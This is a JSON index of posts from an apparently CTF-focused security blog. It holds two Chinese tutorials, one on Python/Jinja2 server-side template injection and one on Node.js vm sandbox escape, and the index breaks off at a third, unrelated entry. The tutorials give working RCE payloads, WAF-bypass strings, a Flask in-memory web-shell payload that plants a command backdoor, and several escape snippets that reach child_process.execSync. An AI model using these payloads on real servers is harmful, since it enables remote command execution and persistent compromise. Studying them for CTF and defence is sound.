[
  
  {
    "title": "Python SSTI研究",
    "url": "/posts/py-ssti/",
    "categories": "Cyber Security",
    "tags": "ctf, web, python, flask, jinja2, SSTI",
    "date": "2025-10-16 12:54:21 +0800",
    "content": "SSTI  在Python中，SSTI经常与jinja2、Django、Mako、Tornado等模版引擎结合，其核心思想是利用模板引擎的核心机制和应用程序将不安全输入传递给模板的方式构造合适的payload以获取风险函数，如popen、system、eval等。  模版引擎  Python的模版引擎大多采用相同的语法结构，{% ... %} 和 {{ ... }} 。前者用于执行诸如 for 循环或赋值的语句，后者把表达式的结果打印到模板上。  在本地编写一个含有SSTI漏洞的测试环境：  from flask import Flask, request, render_template_string  app = Flask(__name__)  @app.route('/') def hello_world():      person = 'lmpr'     if request.args.get('name'):         person = request.args.get('name')     template = '&lt;h1&gt;Hi, %s.&lt;/h1&gt;' % person     return render_template_string(template)  if __name__ == '__main__':     app.run()   并命名为app.py，在当前地址启动服务：  python -m flask run   在http://localhost:5000中可以看到页面，当前显示：  Hi, lmpr.   如果对name传入参数，服务器会给出新的渲染结果，一个测试可以知道这里有没有模版注入漏洞，如果我们请求：  http://localhost:5000?name={{2*2}}   如果返回：  Hi, 4.   说明传入的内容被当做模版引擎语言进行解析和运算，这就意味着这里可能存在SSTI。  需要注意的是，jinja2原生屏蔽符号+，测试时不要使用{{1+1}}等语句。  Python语言特性  Python认为万物皆为对象，这就为我们构造payload以利用SSTI提供了条件。Python是典型的面向对象语言，面向对象的特性就是封装、多态、继承。在构造payload中我们常用封装与继承。  Python认为所有类都有一个顶层基类&lt;class 'Object'&gt;，或者说所有类都直接或间接地是Object的子类。  每一个对象都有自己的“属性”，也就是变量。类实例化后的对象还有“方法”，也就是类中的函数。我们知道可以通过Obj.func()的方法来调用函数，Obj.var的方式来调用属性。  在Python中，每个类都有自己的内置属性，或者“魔术属性”，部分类有内置的“魔术方法”，他们不需要被显式的声明，在被实例化的时候就已经存在。  在 Python SSTI攻击与防御中，理解魔术属性和魔术方法至关重要。这些特殊成员是攻击者利用对象链进行沙箱逃逸的核心工具，也是防御者需要重点监控和限制的关键点。  常用的魔术属性                 属性       作用       SSTI 风险       示例                       __class__       获取对象的类       一般的类对象攻击链起点，获取类对象       ''.__class__→ &lt;class 'str'&gt;                 __bases__       获取类的基类元组       访问继承树       str.__bases__→ (&lt;class 'object'&gt;,)                 __base__       获取第一个基类       快速访问基类       str.__base__→ &lt;class 'object'&gt;                 __mro__       方法解析顺序（继承链）       遍历继承关系       str.__mro__→ (str, object)                 __subclasses__()       获取类的直接子类列表       极高危，访问所有加载的类       object.__subclasses__()                 __mro__       方法解析顺序（继承链）       遍历继承关系       str.__mro__→ (str, object)                 __globals__       获取函数所在模块的全局变量字典       极高危，访问模块全局变量       func.__globals__                 __closure__       获取函数的闭包变量       访问外层作用域变量       func.__closure__[0].cell_contents                 __code__       获取函数的字节码对象       泄露代码信息       func.__code__.co_filename                 __builtins__       内置函数和异常的集合       极高危，访问危险函数       __builtins__.__import__                 __package__       获取模块所属包名       泄露包结构信息       os.__package__                 __spec__       获取模块规范对象       泄露模块信息       os.__spec__.origin                 __name__       获取类/函数/模块名       识别关键对象       os.__name__                 __qualname__       获取限定名称       识别嵌套对象       Class.Method.__qualname__                 __module__       获取定义模块名       定位模块来源       func.__module__                 __doc__       获取文档字符串       泄露实现细节       os.system.__doc__           其中我们最常用的就是__globals__和__import__。  __globals__实际是函数闭包机制的副产品。在Python编译函数时，会将函数所需的外部变量引用存储在__globals__中。它存在的意义是当函数访问非局部变量时，Python 需要知道去哪里查找，一个典型的__globals__可以形如：  {     # === 系统自动添加 ===     '__name__': 'my_module',     '__doc__': None,     '__package__': '',     '__loader__': &lt;_frozen_importlib_external.SourceFileLoader&gt;,     '__spec__': ModuleSpec(...),     '__file__': '/project/my_module.py',     '__cached__': '/project/__pycache__/my_module.cpython-38.pyc',     '__builtins__': &lt;module 'builtins'&gt;,          # === 用户显式导入 ===     'os': &lt;module 'os' from '/usr/lib/python3.8/os.py'&gt;,     'sys': &lt;module 'sys' (built-in)&gt;,     'flask': &lt;module 'flask' from '...'&gt;,          # === 用户定义内容 ===     'APP_CONFIG': {'SECRET_KEY': '114514'},       'db_connection': &lt;Connection object&gt;,         'logger': &lt;Logger my_module (WARNING)&gt;,          # === 函数和类 ===     'my_function': &lt;function my_function at 0x7f8e1c2b5ca0&gt;,     'HelperClass': &lt;class 'my_module.HelperClass'&gt; }   常用的魔术方法                 方法       调用时机       SSTI 风险                       __new__(cls)       创建新实例时       控制对象创建过程                 __init__(self)       对象初始化时       访问初始化上下文                 __del__(self)       对象销毁时       潜在后门入口                 __getattribute__(self, name)       所有属性访问时       属性访问总入口                 __getattr__(self, name)       属性不存在时       动态属性处理                 __setattr__(self, name, value)       设置属性时       修改对象状态                 __dir__(self)       dir()调用时       泄露可用属性                 __call__(self)       对象被调用时       使任意对象可调用                 __func__       获取函数对象       访问底层函数                 __closure__       访问闭包变量       获取外层变量                 __enter__(self)       进入上下文时       返回有风险的对象                 __exit__(self)       退出上下文时       清理操作可能被利用                 __import__(name)       动态导入模块       极高危，RCE核心                 __reduce__(self)       序列化对象时       构造恶意序列化                 __getstate__/__setstate__       序列化控制       篡改序列化状态           常用全局对象  一些常见的，可在全局被调用的函数和对象可能成为我们构造payload的起点：                 函数       来源       利用方式                       lipsum       Jinja2       经典跳板函数                 range       Python内置       生成序列用于遍历                 dict       Python内置       创建字典对象                 cycler       Jinja2       循环生成器                 joiner       Jinja2       字符串连接器                 namespace       Jinja2       创建命名空间                 url_for       Flask       高危跳板函数                 get_flashed_messages       Flask       类似跳板                 config       Flask       极高危，直接访问配置                 request       Flask       请求对象，泄露请求信息                 session       Flask       会话对象，读取/篡改会话                 g       Flask       访问上下文                 current_app       Flask       应用实例，高危，访问应用核心           Payload构造  首先要选取一个可以获取的全局对象，我们以lipsum、config、\" \"分别为例。  由lipsum构造Payload  对于lipsum，当我们在注入点输入{{lipsum}}时可以得到回显：  Hi, &lt;function generate_lorem_ipsum at 0x7f91fe6951c0&gt;.   这代表我们利用的是一个全局的函数对象。那么对于函数对象就可以直接使用__globals__这个魔术属性获取全局上下文，我们编写{{lipsum.__globals__}}得到回显：  Hi, {'__name__': 'jinja2.utils', '__doc__': None, '__package__': 'jinja2', '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f91fe676840&gt;, '__spec__': ModuleSpec(name='jinja2.utils', loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x7f91fe676840&gt;, origin='/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/utils.py'), '__file__': '/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/utils.py', '__cached__': '/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/__pycache__/utils.cpython-312.pyc', '__builtins__': {'__name__': 'builtins', '__doc__':  ... function vars&gt;, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': &lt;class 'bool'&gt;, 'memoryview': &lt;class 'memoryview'&gt;, 'bytearray': &lt;class 'bytearray'&gt;, 'bytes': &lt;class 'bytes'&gt;, 'classmethod': &lt;class 'classmethod'&gt;, 'complex': &lt;class 'complex'&gt;, 'dict': &lt;class 'dict'&gt;, 'enumerate': &lt;class 'enumerate'&gt;, 'filter': &lt;class 'filter'&gt;, 'float': &lt;class 'float'&gt;, 'frozenset': &lt;class 'frozenset'&gt;, 'property': &lt;class 'property'&gt;, 'int': &lt;class 'int'&gt;, 'list': &lt;class 'list'&gt;, 'map': &lt;class 'map'&gt;, 'object': &lt;class 'object'&gt;, 'range': &lt;class 'range'&gt;, 'reversed': &lt;class 'reversed'&gt;, 'set': &lt;class 'set'&gt;, 'slice ... , file \"/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/runtime.py\", line 852&gt;, &lt;code object compile at 0x7f91fe6481f0, file \"/mnt/e/ctfTools/ctfenv/lib/python3.12/site-packages/jinja2/environment.py\", line 731&gt;}, 'concat': &lt;built-in method join of str object at 0xb3c770&gt;, 'pass_context': &lt;function pass_context at 0x7f91fe6947c0&gt;, 'pass_eval_context': &lt;function pass_eval_context at 0x7f91fe6949a0&gt;, 'pass_environment': &lt;function pass_environment at 0x7f91fe694a40&gt;, '_PassArg': &lt;enum '_PassArg'&gt;, 'internalcode': &lt;f ...   许多Web框架会隐式导入os模块，用于处理文件路径、环境变量等，在一般情况下如果我们能在global中发现：  'os': &lt;module 'os' (frozen)&gt;   就说明我们可以利用os模块，紧接着我们就可以调用os模块，因为这个魔术属性__globals__是字典，所以我们可以{{lipsum.__globals__['os']}}或者{{lipsum.__globals__.__getitem__('os')}}：  Hi, &lt;module 'os' (frozen)&gt;.   我们可以通过{{lipsum.__globals__['os'].__dir__()}}查看可用属性：  Hi, ['__name__', '__doc__', ' ... awnvpe', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'popen', '_wrap_close', 'fdopen', '_fspath', 'PathLike'].   我们发现了风险函数popen，于是就有了经典的payload：  {{lipsum.__globals__['os'].popen('whoami').read()}}   注意这里需要.read()来保证回显。  类似地，我们还可以用全局函数url_for来构造相同的payload：  {{url_for.__globals__.os.popen('ls').read()}} {{get_flashed_messages.__globals__['os'].popen('dir').read()}}   由config构造Payload  对于config，当我们在注入点输入{{config}}时可以得到回显为一长串字符，这根前面的情况都不一样。这是因为config是一个类对象，调用其本身会自动触发to String方法，因此我们可以通过__class__返回它的类，{{config.__class__}}：  Hi, &lt;class 'flask.ctx._AppCtxGlobals'&gt;.   我们依然希望仿照上面的方法，去获取一个函数的__globals__属性从而得到风险函数，因此我们希望获取一个类中的函数。  一般来说，类有许多自带的魔术方法可以利用，比如={{config.__class__.__init__}}就会返回：  Hi, &lt;function Config.__init__ at 0x7f91fe6304a0&gt;.   这样我们就有了和上面一样的思路，因此我们构造有payload：  {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}   然而很多时候事实并非都如我们所愿，如果我们举一反三，尝试使用其他魔术方法比如__str__，构造一个payload{{config.__class__.__str__}}，我们会发现有回显：  Hi, &lt;slot wrapper '__str__' of 'object' objects&gt;.   这和我们使用init时有显著差异，当我们继续换一个魔术方法__call__时，{{config.__class__.__call__}}又会有：  Hi, &lt;method-wrapper '__call__' of type object at 0x1b137e10&gt;.   如果我们继续在此基础上尝试获取globals属性，结果会发现没有回显。  同样的问题还会出现在其他对象上，根据前一节的研究，还有很多暴露的全局对象，比如g，当我们试图调用g的init时也会有上述问题。而这是因为，在Python中，带有”wrapper”字样的函数通常是装饰器（decorator）生成的包装函数。这些包装函数在创建时，其__globals__属性通常指向的是装饰器所在模块的全局字典，而不是原始函数所在模块的全局字典，即使包装函数有自己的__globals__，它可能并不包含我们期望的模块（比如os），因为装饰器可能定义在一个与原始函数不同的模块中。                 类型       描述       示例                       slot wrapper       内置类型的 C 实现方法       str.strip, list.append                 method-wrapper       特殊方法的包装器       __init__, __call__                 builtin_function_or_method       内置函数/方法       len, print                 wrapper_descriptor       描述符协议包装器       __get__, __set__           除此之外，一些不需要被用户重写的Python内置方法，比如__dir__会存在访问受限，因而也不可获取__globals__。因而在SSTI攻击中，我们通常会避免使用这些包装函数，而是寻找一个普通的、非内置的、非包装的函数来获取__globals__。  __builtins__的利用  在Python中，__builtins__是一个特殊的模块或字典，它包含了内置的函数、异常和类型。在全局作用域中，__builtins__通常是对内置命名空间的引用。在大多数Python环境中，__builtins__是 builtins模块（Python 3）或 __builtin__模块（Python 2）的引用。  例如我们希望利用全局类对象request来获取风险函数，很流畅地进入了{{request.__class__.__init__.__globals__}}，然而我们发现其globals中并不存在os模块。于是我们考虑换一种方式来导入os模块。我们可以发现在globals中的builtins中含有另一个风险函数eval，我们可以利用eval执行风险python语句从而间接导入os模块，于是就有payload：  {{request.__class__.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('ls').read()\")}}   一般化Payload构造  如果上述的情况都无法使用，我们只好考虑用唯一能获取的对象来曲线救国。我们知道Python的基本数据类型也会有相应的对象，类似地，我们可以有如下方法获得&lt;class 'Object'&gt;：  {{0.__class__.__base__}} {{''.__class__.__bases[0]__}} {{\"\".__class__.__mro[0]__}} {{g.__class__.__base__}}   接着我们会用到一个特殊的魔术方法以返回Object的所有子类：  {{\"\".__class__.__bases__[0].__subclasses__()}}   需要注意的是，这个方法返回的是数组而不是字典，这意味着我们无法通过键值对的方式访问对应的类，只能通过数字索引的方式来获取对应的类。这就是SSTI中最传统的方式，由于每个服务器上Python环境都不同，所以含有风险函数的类的索引也不同，因此我们不能盲目的使用以前的payload。下面给出了一个能够获取数字索引的payload：  {% set classes = range.__class__.__base__.__subclasses__() %} {% for class in classes %} {{ loop.index0 }}: {{ class.__name__ }} ({{ class.__module__ }}) {% endfor %}   利用这个payload我们能获取到一些类。  接下来就是获取该类的方法，然后获取该方法的globals属性，观察有无os或者builtins，这是一项浩瀚的工程，可以借助脚本，也可以记住一些常见的能获取到风险函数的类。  例如在我本地执行上述payload后：  Hi, 0: type (builtins)1: async_generator (builtins)2: bytearray_iterator (builtins) ... 532: StreamWrapper (colorama.ansitowin32)533: AnsiToWin32 (colorama.ansitowin32)534: CompletedProcess (subprocess)535: Popen (subprocess).   我发现535是Popen，这个类的名字带有强烈的暗示性，所以我选择这个索引并查看它的init方法：  Hi, &lt;function Popen.__init__ at 0x7f91fe4528e0&gt;.   说明它存在globals属性，于是读取globals属性，最终发现os模块，因而有payload：  {{range.__class__.__base__.__subclasses__()[535].__init__.__globals__.os.popen(\"whoami\").read()}}   一般来说，在绝大多数环境下，这些类经常被使用：  os._wrap_close warnings.WarningMessage _frozen_importlib.BuiltinImporter subprocess.Popen ctypes.CDLL codecs.StreamReaderWriter   讲到此处我们可以触类旁通地发现，SSTI不只有一种方法去执行，如果我们获取的类本身就足够有特点，那么也不必拘泥于常规。  特殊化Payload构造  以刚刚用过的subprocess.Popen为例，我们可以直接使用这个类创建一个对象，并只需要使用这个类即可：  {{''.__class__.__bases__[0].__subclasses__()[535]('ls', shell=True, stdout=-1).communicate()[0]}}   这样我们就绕过了使用__globals__，直接利用类特性就实现了RCE。  此外，我还发现在CDLL中存在引入libc直接执行命令的方式：  {{range.__class__.__base__.__subclasses__()[526](%27libc.so.6%27).system(%27whoami%27)}}   然而这种方式似乎因为权限问题或者环境变量问题无法正常使用，需要等待后续研究。  内存马  内存马是一种木马，在含有SSTI的地方选择如下payload可以打上内存马。通常用于网页无回显但可以判定为存在SSTI的时候。  {{url_for.__globals__['__builtins__']['eval'](\"app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\\\"global CmdResp;CmdResp=__import__(\\'flask\\').make_response(__import__(\\'os\\').popen(request.args.get(\\'cmd\\')).read())\\\")==None else resp)\",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}   对于这段payload可以拆开解析：  {{      url_for.__globals__['__builtins__']['eval'](         \"app.after_request_funcs.setdefault(None, []).append(\\n\"         \"    lambda resp: \\n\"         \"        CmdResp if request.args.get('cmd') \\n\"         \"        and exec(\\n\"         \"            \\\"global CmdResp; CmdResp = __import__('flask').make_response(\\\"\\n\"         \"            \\\"__import__('os').popen(request.args.get('cmd')).read())\\\"\\n\"         \"        ) == None \\n\"         \"        else resp\\n\"         \")\",         {             'request': url_for.__globals__['request'],             'app': url_for.__globals__['current_app']         }     )  }}   详情可见：  https://mixbp.github.io/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC/  https://xz.aliyun.com/news/13858  https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/  https://xz.aliyun.com/news/10381  WAF绕过  真实环境或者题目环境下会存在许多输入限制，防止你注入，有很多师傅在禁止输入和反禁止输入上有了很多奇技淫巧，叹为观止。前人之述备矣，我的研究也不是很充分，下面是一些比较完善的WAF绕过方法：  https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/  https://xz.aliyun.com/news/7341  SSTI模板注入详细总结及WAF绕过-CSDN博客  ''|attr(\"__class__\")等效于''.__class__，要使用xxx.os('xxx')类似的方法，可以使用xxx|attr(\"os\")('xxx')。即.等价于|attr()  使用flask里的lipsum方法来执行命令：flask里的lipsum方法,可以用于得到__builtins__，而且lipsum.__globals__含有os模块  可以得到lipsum|attr(\"__globals__\")  {{lipsum.__globals__['os']['popen']('ls').read()}}   {% print %} 能在 Flask 模板中输出内容，本质是利用了 Jinja2 允许在 {% %} 标签中执行 Python 表达式的特性，通过调用 Python 内置的 print 函数将内容输出到渲染结果中。  {{\"\".__class__.__bases__[0].__subclasses__()[199].__init__.__globals__['os'].popen(\"ls\").read()}}   {{\"\".__class__.__base__.__subclasses__()[117].__init__.__globals__['builtins']['eval'](\"__import__.('os').popen('ls').read()\")}}   {{url_for.__globals__.os.popen('ls').read()}}   {%print(lipsum|attr(\"_\"+\"_glo\"+\"bals_\"+\"_\")|attr(\"_\"+\"_getitem_\"+\"_\")(\"os\")|attr(\"popen\")(\"cat ../f*\")|attr(\"read\")())%}      request方法绕过：   request在flask中可以访问基于 HTTP 请求传递的所有信息，这里的request并非python的函数，而是在flask内部的函数。  request.args.key  #获取get传入的key的值  request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)  reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get  request.cookies.key  #获取cookies传入参数  request.headers.key  #获取请求头请求参数  request.data  #获取post传入参数(Content-Type:a/b)  request.json  #获取post传入json参数 (Content-Type: application/json)   payload参考https://www.nssctf.cn/note/set/14423  报错的HTML结构框架：  Flask：蓝色调试页，显示完整堆栈  Django：黄色调试页，显示详细设置  Bottle：仅基础HTML+少量CSS  [GHCTF 2025]Message in a Bottle  这是个非常好的题，是python意义上的XSS。  {% set po=dict(po=a,p=b)|join%} {% set a=(()|select|string|list)|attr(po)(24)%} {%print(lipsum|attr(a+a+'glo'+'bals'+a+a)|attr(a+a+'ge'+'titem'+a+a)('o'+'s')|attr('po'+'pen')('tac /f*')|attr('read')())%}   用于下划线绕过"
  },
  
  {
    "title": "Node JS沙箱逃逸",
    "url": "/posts/nodejs-vm-esc/",
    "categories": "Cyber Security",
    "tags": "ctf, web, node, js, vm, sandbox esc",
    "date": "2025-10-01 21:04:21 +0800",
    "content": "Node JS沙箱逃逸  沙箱（Sandbox）一般指运行不受信任的虚拟环境。沙箱逃逸就是让沙箱中运行的代码获取到沙箱外的内容。  在服务端的Nodejs中和window类似的全局对象叫做global，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用global.xxx的方式来访问，直接用xxx就可以调用这个变量。  本文参考自NodeJS VM和VM2沙箱逃逸-先知社区，但为了更好的理解，进行了更详细、更全面的阐述。  vm沙箱                 node:vm 模块允许在 V8 虚拟机上下文中编译和运行代码，在[vm 虚拟机       Node.js v24 文档](https://nodejs.cn/api/vm.html)中有详细介绍。           当我们创建一个虚拟环境时，可以采用：  const vm = require(\"vm\");   如果要将一段语句放入vm中运行，可以使用：  vm.runInContext(code, contextifiedObject[, options\\])  vm.runInNewContext(code[, contextObject[, options\\]])  vm.runInThisContext(code[, options\\])  以vm.runInNewContext(code[, contextObject[, options\\]])为例：  console.log( vm.runInNewContext(`1+1`) );   得到结果：  2   则说明运行成功。  vm.runInContext(code, context) 返回的是在该 context（沙箱 realm）中求值后的结果。这个结果可以是任意 JavaScript 值：原始类型（number/string/boolean/null/undefined）、对象字面量、函数、Proxy、Error 等。  我们需要利用的是：如果返回的是对象/函数/Proxy/带 getter 的东西，宿主进程获得的并不是“值的拷贝”，而是指向沙箱中那个值的引用，因此可能导致回调/钩子在宿主上下文被触发。  借助上下文对象逃逸                 vm沙箱逃逸需要借助其自带类型：上下文对象（contextify）。在 Node.js 中，上下文对象是一个被严格限制的独立作用域容器，其本质上就是一个普通的 JavaScript 对象。它的作用是让 vm 执行的代码只能访问这个对象内部的属性，无法直接访问外部的全局变量。[vm 虚拟机 what-does-it-mean-to-contextify-an-object       Node.js v24 文档](https://nodejs.cn/api/vm.html#what-does-it-mean-to-contextify-an-object)                          Function 对象提供了用于处理函数的方法。在 JavaScript 中，每个函数都是一个 Function 对象。Function的构造函数十分特殊，直接调用此构造函数可以动态创建函数，就像eval()一样， 但其创建的函数只能在全局作用域中运行。这给了沙箱逃逸先决条件。[Function - JavaScript       MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function)           基于此，在具体情况下，可以实现：  console.log( vm.runInNewContext(`this.constructor.constructor(\"return 1\")()`) );   执行此代码得到结果：  1   在不指定自定义上下文时，vm.runInNewContext 的默认上下文是一个空对象 {}，因此代码中的 this 始终指向这个空对象 {}，而这个上下文对象是不属于沙箱环境的；this.constructor是上下文对象的构造函数（{}.constructor === Object 为 true），this.constructor.constructor是上下文对象的构造函数对象的构造函数，由于上下文对象的构造函数是Object，Object 本身是一个函数（typeof Object === 'function'），而所有函数的构造函数都是 Function（Object.constructor === Function 为 true），所以最终return 1会被当作语句执行.  注意在此处不能写作this.constructor().constructor(\"return 1\")，因为这里要调用的是Function的构造函数，而不是Object的构造函数。  接下来只需要找到一些可利用函数就可以实现其他操作。  在Node.js中存在node:child_process 模块，其提供了以与 popen(3)类似但不相同的方式生成子进程的能力，而主要的是通过调用child_process对象的一些方法可以实现命令运行。                 child_process.execSync(command[, options])是一个创建同步进程的方法。可以借助该方法进行恶意操作。[child_process 子进程       Node.js v24 文档](https://nodejs.cn/api/child_process.html#child_processexecsynccommand-options)           在Node.js的Shell环境中：  &gt; vm.runInNewContext(`this.constructor.constructor(\"return child_process\")()`) {   _forkChild: [Function: _forkChild],   ChildProcess: [Function: ChildProcess],   exec: [Function: exec],   execFile: [Function: execFile],   execFileSync: [Function: execFileSync],   execSync: [Function: execSync],   fork: [Function: fork],   spawn: [Function: spawn],   spawnSync: [Function: spawnSync] } &gt; const esc = vm.runInNewContext(`this.constructor.constructor(\"return child_process\")()`); undefined &gt; esc.execSync('whoami').toString() 'lamaper\\n'   在Node.js中还存在process（进程）对象，其提供有关当前 Node.js 进程的信息并对其进行控制。其属性process.mainModule 提供了另一种检索 require.main的方法。不同之处在于，如果主模块在运行时发生更改，则require.main可能仍会引用更改发生前所需模块中的原始主模块。如果没有入口脚本，则 process.mainModule 将是 undefined。  需要注意的是，process.mainModule 新增于: v0.1.17，弃用于: v14.0.0，意味着这个方法已经不被官方推荐（但不代表不能使用）。  此外，在 REPL（交互式 shell）里 require/某些标识符是对 “全局/REPL realm” 可见的，而在模块文件（node file.js）里顶层 require 实际是由模块包装函数注入到模块局部作用域，不是全局变量。简单来说，上述实验只能在REPL中复现，而在实际环境中，必须借助process.mainModule引入需要的模块，如下：  const vm = require(\"vm\"); const y = `this.toString.constructor(\"return process\")()`; console.log(vm.runInNewContext(y)).mainModule.require(\"child_process\").execSync(\"whoami\").toString());   回过头来再研究这个函数：vm.runInContext(script, context)，不难发现前文所举的例子都是忽略context，只提供script。实际上，在忽略context的情况下，Node.js会自己创建一个空的上下文环境{}，显而易见地，script中的this直接代指这个空的上下文环境。  在下文这个例子中：  const vm = require('vm'); const script = `m + n + this.m`; const sandbox = { m: 1, n: 2 }; const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res)   vm.createContext() 会对传入的 sandbox 进行特殊处理：让 sandbox 成为一个全局作用域容器，脚本执行时的 this 会指向这个对象；返回处理后的 context 对象——即被包装后的 sandbox，二者引用相同，修改 context 会同步影响 sandbox。  上述代码的执行结果是  4   显而易见地，this.m指向sandbox，这意味着我们虽然可以通过直接调用this来获取Function构造函数，但不可以使用this.m来获取，如下的代码可以正常运行并得到结果：  const vm = require('vm'); const script = `(() =&gt; {     const esc = this.constructor.constructor(\"return process\")();     return esc.mainModule.require('child_process').execSync('whoami').toString();     })()`; const sandbox = { m: 1, n: 2 }; const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res)   然而，如果将代码改为：  const script = `(() =&gt; {     const esc = this.m.constructor.constructor(\"return process\")();     return esc.mainModule.require('child_process').execSync('whoami').toString();     })()`;   则不能实现。原因是m,n是基本数据类型而不是引用数据类型，如此进行的是值传递，无法拿到沙箱外部的引用。如果将m,n更改为引用数据类型类型，则可以执行：  const vm = require('vm'); const script = `(() =&gt; {     const esc = this.m.constructor.constructor(\"return process\")();     return esc.mainModule.require('child_process').execSync('whoami').toString();     })()`; const sandbox = { m: [], n: {} }; const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res)   劫持toString()逃逸  更进一步地，如果考虑如下情景：  const vm = require('vm'); const script = `...`; const sandbox = Object.create(null); const context = vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log('Hello ' + res)   与前面情景不同的是，sandbox不是一个存在的对象，而是null，因此this === null，无法从内部调用。我们考虑能否使用外部已经存在的对象。  arguments.callee 是 JavaScript 中一个特殊的属性，它包含对当前正在执行的函数的引用。这个属性在匿名函数中尤其有用，因为匿名函数无法通过名称引用自身。然而，arguments.callee已被弃用，不推荐在现代 JavaScript 中使用，但这并不妨碍我们使用它。                 在arguments是函数内部的一个类数组对象，包含了当前函数被调用时传入的所有参数。它仅在函数内部可用，且与函数的参数列表对应。arguments.callee指向当前正在执行的函数本身，即函数自己。[arguments.callee - JavaScript       MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments/callee)                          如果函数 f 是在全局作用域内调用的，则 f.caller 的值为null；否则它就是调用 f 的函数。如果调用 f 的函数是一个严格模式函数，则 f.caller 的值也是 null。[Function.prototype.caller - JavaScript       MDN](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/caller)           以此我们可以得到一个调用链：arguments.callee.caller，其中arguments.callee是一个函数，通过caller获得这个函数的引用。这个引用是在沙箱外，因此我们可以利用前文的思路来获得构造函数。  const script = `(() =&gt; {     const a = {};     a.toString = function(){         const g = arguments.callee.caller;         const f = (g.toString.constructor(\"return process\"))();         return f.mainModule.require('child_process').execSync('whoami').toString();     }     return a;     })()`;   把利用代码放到 toString或其他会被宿主隐式调用的魔术方法中，是为了让沙箱中定义的函数在宿主触发调用时，能够看到宿主调用栈中的函数，即 arguments.callee.caller 指向宿主函数，从而通过调用栈上那个宿主函数的 constructor 拿到宿主 realm 的 Function 构造器，再用它在宿主 realm 执行任意字符串代码，进而访问 process / require / child_process。  此处的关键在于最后一行console.log('Hello ' + res)使用了toString方法，比较有局限性。  这个过程可以概述为：     在 vm 的 sandbox 中创建对象 a，并定义 a.toString = function(){ ... }。这个函数是在沙箱 realm创建的（其 [[Realm]]/内部所属是 sandbox）。   vm.runInContext(...) 返回该对象引用 res 到宿主模块（host）。   宿主做 'Hello ' + res —— JS 规范要求对 res 做 ToPrimitive（字符串上下文），于是会调用 res.toString()（这是宿主触发的调用）。   当宿主执行 res.toString() 时，调用栈上有宿主的函数，比如当前模块的执行函数，因此在 toString 内部使用 arguments.callee.caller 可以访问调用它的那个函数对象，即宿主的 caller。   这个 caller 是宿主 realm 的函数对象，其 .constructor 指向宿主 realm 的 Function。于是 cc.constructor.constructor('return process')() 或等价语句会在宿主 realm 生成并执行一个新的函数，这个函数运行在宿主 realm，因此能看到宿主全局（包括 process / require）。   拿到 process 后再 process.mainModule.require('child_process').execSync('whoami') 就能在宿主上执行命令。   Proxy劫持Get逃逸  Proxy 和 Reflect - 掘金  如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用Proxy来劫持属性。  JavaScript 规范中， [[Get]]，用于读取属性的内部方法， [[Set]]，用于写入属性的内部方法，等等。这些方法仅在规范中使用，我们不能直接通过方法名调用它们。  我们可以利用Proxy绑架其调用属性的方法。代码如下：  const vm = require(\"vm\");  const script =  ` (() =&gt;{     const a = new Proxy({}, {         get: function(){             const cc = arguments.callee.caller;             const p = (cc.constructor.constructor('return process'))();             return p.mainModule.require('child_process').execSync('whoami').toString();         }     })     return a })() `; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res.abc); console.log(\"a\" + res);   在const res = vm.runInContext(script, context)中，res获得到了逃逸出来的Proxy对象，在下一行调用任意一个属性（不一定需要这个属性存在）时，可以调用[[get]]方法，进而执行恶意代码。  触发 toString 的常见场景：字符串拼接（'a' + obj）、模板字符串（${obj}）、显式调用 String(obj)、某些 console/inspect 操作（取决于实现），或 obj + ''。所以有多种办法可以调用。  异常捕获与处理逃逸  一些情况下，代码中不会给出res对象，也就是说执行沙箱后没有返回值被接收。对此可以考虑使用异常处理：  const vm = require(\"vm\");  const script =  `     throw new Proxy({}, {         get: function(){             const cc = arguments.callee.caller;             const p = (cc.constructor.constructor('return process'))();             return p.mainModule.require('child_process').execSync('whoami').toString();         }     }) `; try {     vm.runInContext(script, vm.createContext(Object.create(null))); }catch(e) {     console.log(\"error:\" + e)  }   参考文章：  https://juejin.cn/post/6844904090116292616  https://www.leavesongs.com/  https://vulhub.org/zh  vm2沙箱  &lt;TODO&gt;  https://www.cnblogs.com/zpchcbd/p/16899212.html"
  },
  
  {
    "title": "BIT ECE实习之STM32开发",
    "url": "/posts/bit-ece-stm32/",
    "categories": "Coding",
    "tags": "c/c++, stm32, clion",
    "date": "2025-09-08 16:11:23 +0800",
